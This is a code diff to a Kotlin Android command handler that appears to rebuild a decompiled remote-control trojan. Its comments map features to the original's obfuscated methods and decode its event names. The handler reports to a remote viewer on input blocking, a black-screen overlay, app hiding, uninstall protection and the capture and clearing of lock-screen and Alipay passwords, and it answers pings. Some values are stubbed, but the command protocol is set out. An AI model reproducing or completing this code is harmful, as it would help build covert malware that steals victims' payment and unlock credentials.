@@ -50,13 +50,13 @@ class DeviceStateCommandHandler : CommandHandler {
     private fun handleGetDeviceState(context: CommandContext) {
         Log.d(TAG, "获取设备状态命令已接收")
         try {
-            // ADAPT: Vendor reads from service fields:
-            // - deviceId from service.getDeviceId() (m211470g4)
+            // vendor: reads real values from service fields:
+            // - deviceId from service.m211470g4()
             // - inputBlocked from MaskOverlayManager.touchInterceptEnabled (f55983a5)
-            // - loggingEnabled from SharedPrefs check + service.loggingEnabled (f52411e2)
-            // - blackScreenActive from service.blackScreenActive (f52469k0)
-            // - appHidden from service.isAppHidden() (m211482h6)
-            // - uninstallProtectionEnabled from service.uninstallProtectionEnabled (f52477k8)
+            // - loggingEnabled from SharedPrefs "logging_enabled" check + service.f52411e2
+            // - blackScreenActive from service.f52469k0
+            // - appHidden from service.m211482h6()
+            // - uninstallProtectionEnabled from service.f52477k8
             val data = JSONObject().apply {
                 put("deviceId", "")
                 put("inputBlocked", false)
@@ -100,7 +100,7 @@ class DeviceStateCommandHandler : CommandHandler {
                 })
                 put("statusFileContent", "")
             }
-            // ADAPT: Vendor event type = StringUtil.m212470a0("O1gCKVo3HipoIj9YBS9e")
+            // vendor: event type = StringUtil.m212470a0("O1gCKVo3HipoIj9YBS9e") → "password_status_response"
             context.sendEvent("password_status_response", data)
             Log.d(TAG, "密码状态已发送")
         } catch (e: Exception) {
@@ -119,7 +119,8 @@ class DeviceStateCommandHandler : CommandHandler {
 
             when (passwordType) {
                 "lock" -> {
-                    // ADAPT: Vendor clears via AppStatusManager + CipherCaptureManager
+                    // vendor: clears via AppStatusManager.m210507a6("none", false, ""),
+                    // CipherCaptureManager.m211814b4(true/false), and service.m214865a1(null)
                     Log.d(TAG, "锁屏密码已清空")
                 }
                 "alipay" -> {
@@ -138,7 +139,7 @@ class DeviceStateCommandHandler : CommandHandler {
                 put("passwordType", passwordType)
                 put("cleared", true)
             }
-            // ADAPT: Vendor event = StringUtil.m212470a0("O1gCKVo3HipoMidcEChIPA==")
+            // vendor: event = StringUtil.m212470a0("O1gCKVo3HipoMidcEChIPA==") → "password_cleared"
             context.sendEvent("password_cleared", confirmation)
             Log.d(TAG, "密码清除确认已发送")
         } catch (e: Exception) {
@@ -171,7 +172,7 @@ class DeviceStateCommandHandler : CommandHandler {
                 put("timestamp", timestamp)
                 put("viewerId", viewerId)
             }
-            // ADAPT: Vendor event = StringUtil.m212470a0("L1wHM049Mz5YPyw=")
+            // vendor: event = StringUtil.m212470a0("L1wHM049Mz5YPyw=") → "device_pong"
             context.sendEvent("device_pong", response)
         }
     }
